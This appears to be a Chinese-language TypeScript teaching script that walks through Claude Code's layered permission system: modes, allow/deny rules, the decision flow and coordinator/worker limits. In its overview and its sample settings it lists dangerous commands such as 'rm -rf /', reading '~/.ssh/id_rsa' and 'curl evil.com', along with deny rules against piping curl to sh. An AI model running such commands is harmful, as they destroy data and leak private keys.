/**
 * 04-permission-system.ts — 权限系统深度解析
 *
 * 📌 学习目标：理解 Claude Code 的多层权限决策机制
 *
 * 对应源码文件：
 * - ClaudeCodeSource/hooks/useCanUseTool.tsx                    — 权限入口
 * - ClaudeCodeSource/hooks/toolPermission/PermissionContext.ts  — 权限上下文
 * - ClaudeCodeSource/hooks/toolPermission/handlers/            — 权限处理器
 * - ClaudeCodeSource/Tool.ts:123-138                           — ToolPermissionContext
 *
 * 无需 API Key，直接运行即可学习
 */

// ============================================================
// 1. 权限系统概览
// ============================================================

function showPermissionOverview(): void {
  console.log("=".repeat(70));
  console.log("🔐 Claude Code 权限系统深度解析");
  console.log("=".repeat(70));

  console.log(`
📌 为什么需要权限系统？

  Claude Code 可以执行任意 Shell 命令、读写任意文件
  没有权限控制 = 潜在的安全灾难：
  - rm -rf /           ← 删除整个系统
  - cat ~/.ssh/id_rsa  ← 读取私钥
  - curl evil.com      ← 发送敏感数据

📌 权限系统的设计哲学：

  ┌──────────────────────────────────────────────────────────────┐
  │  "安全性不应该牺牲生产力，生产力不应该牺牲安全性"            │
  │                                                              │
  │  → 已知安全的操作 → 自动批准（如 ls, git status）           │
  │  → 已知危险的操作 → 自动拒绝（如 alwaysDeny 规则）          │
  │  → 不确定的操作   → 询问用户                                │
  │  → 用户说"总是允许" → 记住决策，下次自动批准               │
  └──────────────────────────────────────────────────────────────┘

📌 五层权限决策架构：

  工具调用请求
      ↓
  ┌─── Layer 1: 配置规则 (Config Rules) ───────────────────────┐
  │  alwaysAllow / alwaysDeny / alwaysAsk                       │
  └─────────────────────────┬──────────────────────────────────┘
      ↓ (未匹配则继续)
  ┌─── Layer 2: 安全分类器 (Classifier) ──────────────────────-┐
  │  ML 模型判断命令安全性（可选，需 Feature Flag）             │
  └─────────────────────────┬──────────────────────────────────┘
      ↓ (未确定则继续)
  ┌─── Layer 3: 交互确认 (Interactive) ────────────────────────┐
  │  弹出对话框，用户选择：批准 / 拒绝 / 总是允许              │
  └─────────────────────────┬──────────────────────────────────┘
      ↓ (Coordinator 模式)
  ┌─── Layer 4: 协调器验证 (Coordinator) ─────────────────────-┐
  │  验证 Worker 是否有权执行该工具                             │
  └─────────────────────────┬──────────────────────────────────┘
      ↓
  ┌─── Layer 5: 最终决策 ─────────────────────────────────────-┐
  │  执行 / 拒绝 / 再次询问                                    │
  └────────────────────────────────────────────────────────────┘
`);
}

// ============================================================
// 2. 权限模式（Permission Modes）
// ============================================================

function explainPermissionModes(): void {
  console.log("\n" + "=".repeat(70));
  console.log("🎛️  权限模式（Permission Modes）");
  console.log("=".repeat(70));

  interface PermMode {
    name: string;
    cli: string;
    description: string;
    behavior: string;
    useCase: string;
  }

  const modes: PermMode[] = [
    {
      name: "default",
      cli: "--permissions default",
      description: "每个工具调用都提示用户确认",
      behavior: "所有工具调用 → 弹出确认对话框（除非 alwaysAllow 匹配）",
      useCase: "日常开发，最安全的模式",
    },
    {
      name: "plan",
      cli: "--permissions plan",
      description: "仅允许只读操作，写操作需确认",
      behavior: "读操作自动批准，写操作需确认",
      useCase: "代码审查、架构探索",
    },
    {
      name: "auto",
      cli: "--permissions auto",
      description: "ML 分类器自动判断安全性",
      behavior: "分类器判断安全 → 自动执行；不确定 → 询问用户",
      useCase: "高级用户，追求效率",
    },
    {
      name: "bypassPermissions",
      cli: "--permissions bypassPermissions",
      description: "自动批准所有操作（危险！）",
      behavior: "所有工具调用 → 直接执行，不询问",
      useCase: "CI/CD、自动化脚本（受控环境）",
    },
  ];

  console.log("\n  📌 四种权限模式对比：\n");

  modes.forEach((m) => {
    console.log(`  🔹 ${m.name}`);
    console.log(`     CLI: ${m.cli}`);
    console.log(`     说明: ${m.description}`);
    console.log(`     行为: ${m.behavior}`);
    console.log(`     场景: ${m.useCase}`);
    console.log();
  });
}

// ============================================================
// 3. 权限规则（Permission Rules）
// ============================================================

function explainPermissionRules(): void {
  console.log("=".repeat(70));
  console.log("📜 权限规则系统（Permission Rules）");
  console.log("=".repeat(70));

  console.log(`
📌 权限规则定义在 settings.json / .claude/settings.json 中

  示例配置：
  {
    "permissions": {
      "allow": [
        "Bash(ls *)",           // 允许所有 ls 命令
        "Bash(git status)",     // 允许 git status
        "Bash(npm run *)",      // 允许所有 npm run 命令
        "Read(*)",              // 允许读取所有文件
        "Glob(*)",              // 允许所有文件搜索
        "Grep(*)"               // 允许所有内容搜索
      ],
      "deny": [
        "Bash(rm -rf *)",       // 禁止 rm -rf
        "Bash(curl * | sh)",    // 禁止管道执行
        "Read(~/.ssh/*)",       // 禁止读取 SSH 密钥
        "Write(/etc/*)"         // 禁止写入系统目录
      ]
    }
  }

📌 规则数据结构：

  type PermissionRule = {
    id: string                         // 规则 ID
    source: 'user' | 'sdk' | 'hook'    // 规则来源
    sourceId?: string                  // 来源标识
    toolPattern: string                // 工具名匹配（glob）
    inputPattern?: Record<...>         // 输入匹配
    behavior: 'allow' | 'deny' | 'ask' | 'passthrough'
  }

📌 规则来源与优先级：

  ┌─────────────────────────────────────────────────────────────┐
  │ 优先级（从高到低）：                                        │
  │                                                             │
  │  1. 会话内用户决策（"总是允许" → 临时规则）                │
  │  2. 项目级 .claude/settings.json                           │
  │  3. 用户级 ~/.claude/settings.json                         │
  │  4. SDK 提供的规则                                         │
  │  5. Hook 动态添加的规则                                    │
  │  6. 默认行为（取决于 PermissionMode）                      │
  │                                                             │
  │  🔑 关键：高优先级规则覆盖低优先级                         │
  │  SDK 规则可以被用户设置覆盖 → 用户始终有最终控制权         │
  └─────────────────────────────────────────────────────────────┘

📌 规则匹配机制：

  匹配示例：
  ┌──────────────────────────────┬──────────────────────────────┐
  │ 规则                         │ 匹配的工具调用               │
  ├──────────────────────────────┼──────────────────────────────┤
  │ Bash(ls *)                   │ Bash("ls -la"), Bash("ls /") │
  │ Read(/src/*)                 │ Read("/src/main.ts")         │
  │ Write(*.test.ts)             │ Write("app.test.ts")         │
  │ *                            │ 所有工具的所有调用           │
  └──────────────────────────────┴──────────────────────────────┘
`);
}

// ============================================================
// 4. 权限决策流程
// ============================================================

function explainDecisionFlow(): void {
  console.log("=".repeat(70));
  console.log("🔍 权限决策完整流程");
  console.log("=".repeat(70));

  console.log(`
📌 canUseTool() 函数的完整决策逻辑：

  async function canUseTool(
    tool: Tool,
    input: Record<string, unknown>,
    toolUseContext: ToolUseContext,
    assistantMessage: AssistantMessage,
    toolUseID: string
  ): Promise<PermissionDecision>

  ┌─── Step 1: 配置规则匹配 ────────────────────────────────────┐
  │                                                              │
  │  const configDecision = hasPermissionsToUseTool(             │
  │    tool, input, ctx, assistantMsg, toolUseID                 │
  │  )                                                           │
  │                                                              │
  │  检查顺序：                                                  │
  │  1. alwaysDeny 规则 → 匹配则直接 DENY                       │
  │  2. alwaysAllow 规则 → 匹配则直接 ALLOW                     │
  │  3. alwaysAsk 规则 → 匹配则需要 ASK                         │
  │  4. 无匹配 → 根据 PermissionMode 决定                       │
  │                                                              │
  │  if (configDecision.behavior === 'allow') → 执行            │
  │  if (configDecision.behavior === 'deny')  → 拒绝            │
  │  if (configDecision.behavior === 'ask')   → 继续下一步      │
  └──────────────────────────────────────────────────────────────┘
          ↓ (需要 ASK)
  ┌─── Step 2: 安全分类器（可选） ─────────────────────────────-┐
  │                                                              │
  │  if (tool.name === 'Bash' && feature('BASH_CLASSIFIER')) {   │
  │    const result = peekSpeculativeClassifierCheck(input.cmd)  │
  │    if (result.matches && result.confidence === 'high') {     │
  │      return ALLOW  // 分类器高置信度 → 跳过交互确认         │
  │    }                                                         │
  │  }                                                           │
  │                                                              │
  │  💡 "推测性分类"：在 LLM 响应流式传输时就开始分类          │
  │  当需要权限决策时，分类结果可能已经就绪                     │
  └──────────────────────────────────────────────────────────────┘
          ↓ (分类器未覆盖)
  ┌─── Step 3: 交互确认 ───────────────────────────────────────-┐
  │                                                              │
  │  // 非交互会话 → 自动拒绝                                  │
  │  if (isNonInteractiveSession()) return DENY                  │
  │                                                              │
  │  // Swarm Worker 模式 → 自动拒绝（由 Coordinator 决定）    │
  │  if (isTeammateMode()) return DENY                           │
  │                                                              │
  │  // Coordinator 模式 → 等待自动化检查                       │
  │  if (awaitAutomatedChecks) {                                 │
  │    const coordDecision = handleCoordinatorPermission(...)    │
  │    if (coordDecision) return coordDecision                   │
  │  }                                                           │
  │                                                              │
  │  // 交互模式 → 弹出对话框                                  │
  │  const decision = await showPermissionDialog({               │
  │    tool: tool.name,                                          │
  │    description: await tool.description(input, ctx),          │
  │    input: input,                                             │
  │  })                                                          │
  │                                                              │
  │  // 用户选择：                                              │
  │  // ✅ 批准一次 → 本次允许                                  │
  │  // ✅ 总是允许 → 添加到 alwaysAllow 规则                   │
  │  // ❌ 拒绝     → 返回 DENY                                 │
  └──────────────────────────────────────────────────────────────┘
`);
}

// ============================================================
// 5. 模拟权限决策
// ============================================================

async function simulatePermissionDecisions(): Promise<void> {
  console.log("\n" + "=".repeat(70));
  console.log("🧪 模拟权限决策场景");
  console.log("=".repeat(70));

  interface ToolCall {
    tool: string;
    input: string;
    rules: string[];
    decision: string;
    reason: string;
  }

  const scenarios: ToolCall[] = [
    {
      tool: "Bash",
      input: 'command: "ls -la"',
      rules: ["alwaysAllow: Bash(ls *)"],
      decision: "✅ ALLOW",
      reason: "匹配 alwaysAllow 规则",
    },
    {
      tool: "Bash",
      input: 'command: "rm -rf /tmp"',
      rules: ["alwaysDeny: Bash(rm -rf *)"],
      decision: "❌ DENY",
      reason: "匹配 alwaysDeny 规则",
    },
    {
      tool: "Read",
      input: 'file: "~/.ssh/id_rsa"',
      rules: ["alwaysDeny: Read(~/.ssh/*)"],
      decision: "❌ DENY",
      reason: "匹配 alwaysDeny 规则（敏感路径）",
    },
    {
      tool: "Bash",
      input: 'command: "npm run build"',
      rules: ["无匹配规则"],
      decision: "❓ ASK → 用户批准",
      reason: "无匹配规则 → 交互确认 → 用户选择批准",
    },
    {
      tool: "Bash",
      input: 'command: "docker rm container"',
      rules: ["无匹配规则", "分类器: 中等风险"],
      decision: "❓ ASK → 用户选择总是允许",
      reason: "无规则 → 分类器不确定 → 用户批准并选择'总是允许'",
    },
    {
      tool: "Write",
      input: 'file: "src/main.ts"',
      rules: ["plan 模式"],
      decision: "❓ ASK",
      reason: "Plan 模式下写操作需要确认",
    },
    {
      tool: "Glob",
      input: 'pattern: "**/*.ts"',
      rules: ["默认允许只读"],
      decision: "✅ ALLOW",
      reason: "Glob 是只读操作，默认允许",
    },
  ];

  console.log("\n  📌 7 个权限决策场景模拟：\n");

  scenarios.forEach((s, i) => {
    console.log(`  场景 ${i + 1}: ${s.tool}(${s.input})`);
    console.log(`  规则: ${s.rules.join(", ")}`);
    console.log(`  决策: ${s.decision}`);
    console.log(`  原因: ${s.reason}`);
    console.log();
  });

  // 模拟"总是允许"的规则累积
  console.log("  📌 '总是允许'的规则累积效果：\n");
  console.log("  初始规则集: { allow: ['Bash(ls *)'] }");
  console.log("  用户对 'npm run build' 选择总是允许...");
  console.log("  更新规则集: { allow: ['Bash(ls *)', 'Bash(npm run *)'] }");
  console.log("  用户对 'docker rm' 选择总是允许...");
  console.log("  更新规则集: { allow: ['Bash(ls *)', 'Bash(npm run *)', 'Bash(docker *)'] }");
  console.log("\n  → 随着使用，规则集越来越精确，确认对话框越来越少");
  console.log("  → 实现了'渐进式信任'模式");
}

// ============================================================
// 6. Coordinator/Worker 权限
// ============================================================

function explainCoordinatorPermissions(): void {
  console.log("\n" + "=".repeat(70));
  console.log("🤝 Coordinator/Worker 模式的权限约束");
  console.log("=".repeat(70));

  console.log(`
📌 多 Agent 场景的权限挑战：

  Coordinator（主管 Agent）
    ├─ Worker A（前端开发）
    ├─ Worker B（后端开发）
    └─ Worker C（测试编写）

  问题：Worker 应该有多大的权限？
  → 太大：Worker 失控可能造成破坏
  → 太小：Worker 无法完成任务

📌 解决方案：分层权限约束

  ┌─── Coordinator 权限 ───────────────────────────────────────┐
  │ • 拥有完整工具集                                            │
  │ • 可以创建/管理 Worker                                      │
  │ • 可以分配工具权限范围                                      │
  └─────────────────────────────────────────────────────────────┘
          ↓ 授权
  ┌─── Worker 权限 ────────────────────────────────────────────-┐
  │ • 受限工具集：                                              │
  │   ✅ Bash, Read, Edit, Write, Glob, Grep  （基础操作）     │
  │   ✅ Agent, SendMessage                     （协作通信）    │
  │   ❌ TeamCreate, TeamDelete                  （管理工具）    │
  │   ❌ 直接 MCP 调用                          （安全考虑）    │
  │                                                              │
  │ • 权限提升：                                                │
  │   Worker 遇到无权操作 → SendMessage 给 Coordinator          │
  │   Coordinator 审批后代为执行                                 │
  │                                                              │
  │ • 自动拒绝：                                                │
  │   shouldAvoidPermissionPrompts = true                        │
  │   → Worker 不能弹出交互确认框（因为没有终端）              │
  │   → 不确定的操作直接拒绝                                    │
  └─────────────────────────────────────────────────────────────┘

📌 Worker 权限验证流程：

  Worker 要执行 Bash("npm install")
      ↓
  1. 检查工具是否在 Worker 允许列表中
     → Bash ✅ 在列表中
      ↓
  2. 检查配置规则
     → 没有 alwaysAllow 匹配
      ↓
  3. 需要 ASK?
     → shouldAvoidPermissionPrompts = true
     → 自动 DENY（Worker 不能弹框）
      ↓
  4. Worker 通过 SendMessage 告知 Coordinator
     "我需要执行 npm install 但权限不足"
      ↓
  5. Coordinator 审批后代为执行
`);
}

// ============================================================
// 7. 小结
// ============================================================

function showSummary(): void {
  console.log("\n" + "=".repeat(70));
  console.log("📝 权限系统学习要点");
  console.log("=".repeat(70));

  console.log(`
  1️⃣  五层决策：规则 → 分类器 → 交互 → 协调器 → 最终决策
  2️⃣  四种模式：default / plan / auto / bypassPermissions
  3️⃣  规则优先级：会话决策 > 项目设置 > 用户设置 > SDK > 默认
  4️⃣  渐进式信任：用户的"总是允许"逐步构建信任规则集
  5️⃣  Worker 约束：受限工具集 + 不能弹框 + 权限提升机制

  📌 设计哲学总结：
  - 最小权限原则：默认需要确认，而非默认允许
  - 用户至上：用户设置可覆盖任何 SDK/系统规则
  - 渐进信任：通过使用积累信任，逐步减少确认次数
  - 安全降级：不确定时宁可拒绝也不冒险执行

  📌 思考题：
  - "总是允许"会不会造成安全隐患？如何平衡？
  - 安全分类器的误判（假阳性/假阴性）会有什么影响？
  - 如何设计一个既安全又高效的权限系统？
  - Worker 不能弹框的约束合理吗？有没有更好的方案？

  📂 建议阅读的源码文件（按顺序）：
  1. ClaudeCodeSource/Tool.ts:123-138         — ToolPermissionContext 定义
  2. ClaudeCodeSource/hooks/useCanUseTool.tsx  — 权限决策入口
  3. ClaudeCodeSource/hooks/toolPermission/handlers/ — 各模式处理器
  4. ClaudeCodeSource/coordinator/coordinatorMode.ts — Worker 约束
`);
}

// ============================================================
// 主入口
// ============================================================

async function main(): Promise<void> {
  showPermissionOverview();
  explainPermissionModes();
  explainPermissionRules();
  explainDecisionFlow();
  await simulatePermissionDecisions();
  explainCoordinatorPermissions();
  showSummary();
}

const isMainModule =
  import.meta.url === `file://${process.argv[1]}` ||
  process.argv[1]?.endsWith("04-permission-system.ts");

if (isMainModule) {
  main().catch(console.error);
}

export { showPermissionOverview, explainPermissionModes };
